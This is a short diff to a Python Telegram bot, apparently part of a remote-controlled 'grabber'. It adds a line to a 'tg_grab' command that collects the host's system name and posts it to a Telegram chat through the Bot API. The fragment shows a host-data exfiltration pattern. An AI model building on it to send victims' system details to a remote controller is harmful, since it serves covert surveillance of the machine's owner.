@@ -286,6 +286,7 @@ def start(message):
     bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
 @bot.message_handler(commands=['tg_grab'])
 def send_message_to_group(chat_id):
+    system_name = platform.system()  # Определение системного имени
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
     data = {'chat_id': chat_id, 'text': f"System Name: {system_name}\n"}
     response = requests.post(url, data=data)
